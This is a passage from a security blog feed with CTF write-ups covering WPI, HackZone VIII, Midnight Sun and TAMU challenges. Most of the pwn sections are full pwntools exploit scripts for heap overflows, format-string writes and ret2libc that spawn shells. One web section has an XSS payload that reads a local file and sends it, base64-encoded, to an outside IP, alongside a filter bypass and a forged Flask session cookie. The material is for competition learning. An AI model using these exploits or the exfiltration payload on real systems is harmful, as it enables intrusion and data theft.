&lt;p&gt;Of course as the most vigilant readers noticed , it&amp;rsquo;s using the dangerous function &lt;strong&gt;gets&lt;/strong&gt; so we have the possibility to overflow stuffs :D Now here is our plan:&lt;/p&gt;
&lt;p&gt;We will abuse the gets function and overwrite the jumpToHoth address with &lt;strong&gt;jumpToNaboo&lt;/strong&gt; function which will prints the flag for us
Before that we need to figure out the offset so let&amp;rsquo;s open the binary in gdb, set a breakpoint after gets and enter a simple pattern&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Xpc9YFp.png&#34; alt=&#34;GDB&#34;&gt;&lt;/p&gt;
&lt;p&gt;After that let&amp;rsquo;s visualize the interesting part of the heap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/qb2XMHG.png&#34; alt=&#34;HEAP&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see the &amp;ldquo;AAAAAAAABBBBBBBB&amp;rdquo; that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let&amp;rsquo;s begin writing our exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
p=process(&amp;quot;./JNF&amp;quot;)
#p=remote(&amp;quot;192.241.138.174&amp;quot;,9996)
p.recvuntil(&amp;quot;CONSOLE&amp;gt;&amp;quot;)
WIN=p64(0x000000000040070e)
OFFSET=&amp;quot;1&amp;quot;+&amp;quot;A&amp;quot;*79
payload=OFFSET
payload+=WIN
p.sendline(payload)
log.info(&amp;quot;Found Flag ! &amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The reason why i wrote *&lt;em&gt;OFFSET=&amp;ldquo;1&amp;rdquo;+&amp;ldquo;A&amp;rdquo;&lt;em&gt;79&lt;/em&gt;&lt;/em&gt; is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;        gets(local_20);
        lVar2 = strtol(local_20,&amp;amp;local_28,10);
        *(short *)(local_20 + 0x40) = (short)lVar2;
        sVar1 = *(short *)(local_20 + 0x40);
        if (sVar1 != 2) break;
        puts(&amp;quot;Checking navigation...&amp;quot;);
        (*local_18[1])();
      }
      if (2 &amp;lt; sVar1) break;
      if (sVar1 == 1) { .....
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Why 0x000000000040070e not the real address 0x000000000040070a&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/LcvZ0yt.png&#34; alt=&#34;FUNC&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we know gets function stops when it encounters &amp;ldquo;\n&amp;rdquo; (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :(
Fortunately observing the assembly code of &lt;strong&gt;jumpToNaboo&lt;/strong&gt; function we will see that we can start from the address that holds the part we want , which is printing the flag :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/YEv55cw.png&#34; alt=&#34;ASSEMBLY&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Finally running the exploit will bring the flag for us :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Hzqpy0X.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
&lt;p&gt;That was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let&amp;rsquo;s pass now to the second task which is a format string vulnerability.&lt;/p&gt;
&lt;h2 id=&#34;dorsia3-250pts-55-solves&#34;&gt;Dorsia3 250pts (55 solves)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/CkCR80H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/nanoprint&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; and the libc 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/libc.so.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
&lt;h3 id=&#34;tldr-1&#34;&gt;TL;DR&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;introduction-1&#34;&gt;Introduction&lt;/h3&gt;
&lt;p&gt;As a quick introduction this is a brief explanation of the format string vulnerability :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack.
&lt;em&gt;&lt;strong&gt;Wikipedia&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A quick Example :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/1ImQ6zG.png&#34; alt=&#34;FMT&#34;&gt;&lt;/p&gt;
&lt;p&gt;If things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D&lt;/p&gt;
&lt;h3 id=&#34;exploitation-1&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;In this task we are given the source code of the task , the binary and the libc .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/26HRSAR.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/by2UA23.png&#34; alt=&#34;BINARY&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s do some static analysis , running the file and checksec commands , we get these results:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/krietXO.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So we have a 32 bit binary with PIE and NX protections enabled , so we won&amp;rsquo;t be able to overwrite the GOT entry of a function since its address is randomized .&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Let&amp;rsquo;s Get our hands dirty&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Firstly , let&amp;rsquo;s create a pad function to make sure that the offset won&amp;rsquo;t change and let&amp;rsquo;s find the offset of our format string to know exactly where our buffer starts.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
p=process(&amp;quot;./nanoprint&amp;quot;)
p.recvline()
p.sendline(pad(&amp;quot;BAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|&amp;quot;))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/065Lo1y.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So our offset will be 7 , now let&amp;rsquo;s talk about our scenario , we will overwrite the saved eip with a one gadget from the libc ==&amp;gt; Spawn a shell \o/&lt;/p&gt;
&lt;p&gt;We have all we need , an address from the stack and the system function address from libc, so let&amp;rsquo;s write our exploit and retrieve these address properly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
p=process(&amp;quot;./nanoprint&amp;quot;)
#p=remote(&amp;quot;dorsia3.wpictf.xyz&amp;quot;,31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info(&amp;quot;Buffer starts: &amp;quot;+hex(BUFFER))
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
pause()
p.sendline(pad(&amp;quot;JUNK&amp;quot;))
p.interactive()


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since we have the libc binary let&amp;rsquo;s calculate the libc base , and using gdb lets run the first part of our exploit and try to figure the offset between our buffer and the saved eip :&lt;/p&gt;
&lt;p&gt;1- Run our little exploit&lt;/p&gt;
&lt;p&gt;2- run gdb with the following command:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gdb -p `pidof nanoprint`&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/3sALPs3.png&#34; alt=&#34;GDB&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/1KGRjzU.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So the offset is 0x71 ,finally  let&amp;rsquo;s choose the one gadget , i have used the famous 
&lt;a href=&#34;https://github.com/david942j/one_gadget&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;one_gadget&lt;/a&gt; tool&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Ly6WJjh.png&#34; alt=&#34;LIBC&#34;&gt;&lt;/p&gt;
&lt;p&gt;After some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x3d0e0 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x40, environ)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;constraints:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;esi is the GOT address of libc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[esp+0x40] == NULL&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;now we have everything we need let&amp;rsquo;s finish our exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
#p=process(&amp;quot;./nanoprint&amp;quot;)
p=remote(&amp;quot;dorsia3.wpictf.xyz&amp;quot;,31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info(&amp;quot;Buffer starts: &amp;quot;+hex(BUFFER))
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
BASE=SYSTEM-0x3d200
one_gadget=BASE+0x3d0e0
RET=BUFFER+0x71
RET2=RET+2
log.info(&amp;quot;Writing to: &amp;quot;+hex(RET))
payload=&amp;quot;B&amp;quot;
payload+=p32(RET)
payload+=p32(RET2)
off1=(one_gadget &amp;amp; 0xffff)-9 #First 2 bytes
off2=int(hex(one_gadget &amp;amp; 0xffff0000)[:-4],16)-(one_gadget &amp;amp; 0xffff)  
log.info(&amp;quot;one gadget address: &amp;quot;+hex(one_gadget))
log.info(&amp;quot;offset1 and 2: &amp;quot;+str(off1)+&amp;quot;|&amp;quot;+str(off2))
payload+=&amp;quot;%&amp;quot;+str(off1)+&amp;quot;x&amp;quot;
payload+=&amp;quot;%7$hn&amp;quot;
payload+=&amp;quot;%&amp;quot;+str(off2)+&amp;quot;x&amp;quot;
payload+=&amp;quot;%8$hn&amp;quot;
#pause()
p.sendline(pad(payload))
p.interactive()

#Offset buffer-ret : +0x71
#offset fmt 7

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running our exploit will spawn the shell for us \o/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/MWLKHRX.png&#34; alt=&#34;SHELL&#34;&gt;&lt;/p&gt;
&lt;p&gt;Thank you for reading the whole writeup :D I hope you liked it , you can check my github repo where i share my 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CTF writeups&lt;/a&gt; ! Arigatoo \o/&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>HackZone VIII - Web Writeups</title>
      <link>https://ahmed-belkahla.me/post/hackzone-viii/</link>
      <pubDate>Sun, 12 Apr 2020 00:10:44 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/hackzone-viii/</guid>
      <description>&lt;p&gt;Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/xrafZEo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;babyweb1722pts10-solves&#34;&gt;&lt;strong&gt;BabyWeb1(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/zu1XKQe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/9hXA90t.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Trying to post a picture with the same title of the posted pictures will be denied so let&amp;rsquo;s try SQL truncation attack and submit a picture with these details :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Title : &amp;ldquo;naaah                                                                 &amp;quot;&lt;/li&gt;
&lt;li&gt;url : &amp;ldquo;anything here&amp;rdquo;
-msg : &amp;ldquo;anything&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And Bingo it passed the title check and we got a password :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/rywyGg4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using this password will give us the details of the picture and the flag if we check the source code :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bpK7N8F.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;insecure884pts4-solves&#34;&gt;&lt;strong&gt;Insecure(884pts)(4 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ehpXH1T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/lISjgSe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Accessing this url will give us the first part (The same bucket where Hackzone Logo is stored)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;
&lt;a href=&#34;https://storage.googleapis.com/hzviii/flag_part1.txt&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://storage.googleapis.com/hzviii/flag_part1.txt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1st Part:&lt;/strong&gt; HZVIII{Buck3t_M1sc0nf1gur4t1on_&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files .
It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd&lt;/p&gt;
&lt;p&gt;After some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it&amp;rsquo;s using phantom Js to convert this text .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/UAn5UOk.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our scenario now is revealed , we&amp;rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered .
I passed a lot of time in this part and tried a lot with basically this payload but i didn&amp;rsquo;t get anything :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;aa&amp;quot; onerror=&amp;quot;function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener(&#39;load&#39;, reqListener); 
oReq.open(&#39;GET&#39;, &#39;file:///psycor/flag_part2.txt&#39;); 
oReq.send();&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I have than tried to read it using iframes but i didn&amp;rsquo;t have any results :&#39;(&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bZInnkb.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This was really painful xd i thinked that maybe using onerror attribute , phantom Js won&amp;rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it&amp;rsquo;s filtered so all we have to do is bypass this filter :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ySPcXuS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we see in the picture below , the script word is stripped so what if we enter :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;scscriptript&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The script word will be stripped and Bingo we will have our script tag , let&amp;rsquo;s try it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/OqHP5I5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;scscriptript src=&amp;quot;http://100.26.206.184:1234/test.js&amp;quot;&amp;gt;&amp;lt;/scscriptript&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE :&lt;/strong&gt; It&amp;rsquo;s my VPS IP so DONT use it :D&lt;/p&gt;
&lt;p&gt;And i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener(&amp;quot;load&amp;quot;, reqListener); 
oReq.open(&amp;quot;GET&amp;quot;, &amp;quot;file:///psycor/flag_part2.txt&amp;quot;); 
oReq.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And yees we received an answer :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hTbrKXX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Base64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts&lt;/p&gt;
&lt;h1 id=&#34;calculator722pts10-solves&#34;&gt;&lt;strong&gt;Calculator(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/iLqircE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We will now leak the Secret key of the app and sign a session cookie that has the attribute &amp;ldquo;is_admin&amp;rdquo; set to True .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jTwwuLm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;To do that we will use flask-unsign tool with the following command :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flask-unsign &amp;ndash;sign &amp;ndash;cookie &amp;ldquo;{&amp;lsquo;is_admin&amp;rsquo;: True}&amp;rdquo; &amp;ndash;secret &amp;lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8&amp;rsquo; &amp;ndash;legacy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/NIEbykl.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And changing the cookie will give us the flag !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/xOhQh4y.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn&amp;rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Midnight Sun CTF Quals 2020 - Pwn Writeups</title>
      <link>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</link>
      <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</guid>
      <description>&lt;h1 id=&#34;pwn170pts&#34;&gt;&lt;strong&gt;pwn1(70pts)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/4fbyzFx.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
p=remote(&amp;quot;pwn1-01.play.midnightsunctf.se&amp;quot;,10001)
#p=process(&amp;quot;./pwn1&amp;quot;)
OFFSET=cyclic(72)
POP_RDI_RET=p64(0x0000000000400783)
PUTS=p64(0x0000000000400550)
LEAK=p64(0x602020)
MAIN=p64(0x400698)
payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN
log.info(&amp;quot;Payload Crafted&amp;quot;)
p.recvuntil(&amp;quot;buffer:&amp;quot;)
log.info(&amp;quot;Sending payload&amp;quot;)
#raw_input(&amp;quot;attach&amp;quot;)
p.sendline(payload) 
data=p.recvline().strip()
leak=u64(data.ljust(8,&amp;quot;\x00&amp;quot;))
BASE_LIBC=leak-0x64e80       # local 0x54a20 
log.info(&amp;quot;leaked libc base: &amp;quot;+hex(BASE_LIBC))
p.recvuntil(&amp;quot;buffer:&amp;quot;)
#BINSH=p64(BASELIBC+0x183cee)
#SYSTEM=p64(BASELIBC+0x46ed0)
RET=p64(0x0000000000400536)  
SYSTEM=p64(BASE_LIBC+0x4f440)
BINSH=p64(BASE_LIBC+0x1b3e9a)
payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM
p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Check Task files ** 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
&lt;h1 id=&#34;pwn280pts&#34;&gt;&lt;strong&gt;pwn2(80pts)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/lYjuGsS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D
Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
def extract(add,n):
        p1=&amp;quot;0x&amp;quot;+add[-4:]
        p2=add[:6]
        if n==1:
                return p1
        if n==2:
                return p2
def pad(payload):
        return payload+&amp;quot;X&amp;quot;*(63-len(payload))
#p=process(&amp;quot;./pwn2&amp;quot;)
p=remote(&amp;quot;pwn2-01.play.midnightsunctf.se&amp;quot;,10002)
p.recvuntil(&amp;quot;input:&amp;quot;)
EXITGOT=p32(0x804b020)
EXITGOT2=p32(0x804b020+2)
&#39;&#39;&#39;
s=&amp;quot;&amp;quot;
for i in range(27,34):
        s+=&amp;quot;%&amp;quot;+str(i)+&amp;quot;$p &amp;quot;
&#39;&#39;&#39;
payload=EXITGOT+EXITGOT2
payload+=&amp;quot;%2044x%8$hn%32231x%7$hn&amp;quot;
#raw_input(&amp;quot;attach&amp;quot;)
p.sendline(pad(payload))
p.recvuntil(&amp;quot;input:&amp;quot;)
p.sendline(pad(&amp;quot;%30$x&amp;quot;))
data=p.recvuntil(&amp;quot;X&amp;quot;)
printf=int(&amp;quot;0x&amp;quot;+data[-9:-1],16)-5
LIBCBASE=printf-0x50b60
log.info(&amp;quot;Leaked Libc Base : &amp;quot;+hex(LIBCBASE))
p.recvuntil(&amp;quot;input:&amp;quot;)
PRINTFGOT=p32(0x804b00c)
PRINTFGOT2=p32(0x804b00c+2)
SYSTEM=LIBCBASE+0x3cd10
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
payload=PRINTFGOT
payload+=PRINTFGOT2
p1=int(extract(hex(SYSTEM),1),16)
p2=int(extract(hex(SYSTEM),2),16)
log.info(&amp;quot;P1: &amp;quot;+str(p1-8)+&amp;quot; P2: &amp;quot;+str(p2-p1))
payload+=&amp;quot;%&amp;quot;+str(p1-8)+&amp;quot;x%7$hn%&amp;quot;+str(p2-p1)+&amp;quot;x%8$hn&amp;quot;
log.info(&amp;quot;Payload crafted&amp;quot;)
p.sendline(pad(payload))
p.recvuntil(&amp;quot;input:&amp;quot;)
p.sendline(&amp;quot;/bin/sh&amp;quot;)
p.interactive()

#Main address 0x80485eb
# 7 stack adress

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;These tasks were really fun, i&amp;rsquo;m sorry for the lack of details because i&amp;rsquo;m really busy this period :(&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TAMU CTF 2020 - Pwn Writeups</title>
      <link>https://ahmed-belkahla.me/post/tamuctfpwn/</link>
      <pubDate>Mon, 30 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/tamuctfpwn/</guid>
      <description>&lt;h2 id=&#34;b64decoder-244pts&#34;&gt;&lt;strong&gt;B64DECODER (244pts)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ZVHG4PA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/EIv7uYX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it&amp;rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
import sys
def pad(str):
        return str+&amp;quot;X&amp;quot;*(32-len(str))
payload=&amp;quot;&amp;quot;
#p=process(&amp;quot;./b64decoder&amp;quot;)
p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,2783)
d=p.recvuntil(&amp;quot;name!&amp;quot;)
A64Ladd=d[:-18][-10:]
TOWRITE=&amp;quot;0x&amp;quot;+A64Ladd[-4:]
sys=int(TOWRITE,16)-1680-4  #A64l-0x690
log.info(TOWRITE)
log.info(sys)
A64L_PLT=0x804b398
a64lADD=p32(A64L_PLT)
payload+=a64lADD
payload+=&amp;quot;%&amp;quot;+str(sys)+&amp;quot;x%71$hn&amp;quot;
log.info(&amp;quot;payload crafted&amp;quot;)
p.sendline(payload)
log.info(&amp;quot;Sent , Haaaw el shell&amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Bingo we got our shell :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jd78uIm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
